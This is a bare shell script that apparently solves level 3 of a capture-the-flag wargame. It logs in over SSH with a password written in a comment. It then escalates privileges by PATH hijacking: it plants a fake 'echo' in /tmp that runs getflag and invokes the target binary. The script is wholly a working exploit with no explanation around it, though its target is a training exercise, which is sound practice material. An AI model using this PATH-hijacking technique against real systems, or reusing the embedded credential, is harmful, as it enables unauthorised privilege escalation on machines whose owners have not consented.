#! /usr/bin/env sh

# password: kooda2puivaav1idi4f57q8iq
ssh level03@$1 -p 4242 "cat /home/user/level03/level03"
ssh level03@$1 -p 4242 "export PATH=/tmp:\$PATH; echo \"#! /usr/bin/env getflag\" > /tmp/echo; chmod +x /tmp/echo; ./level03"
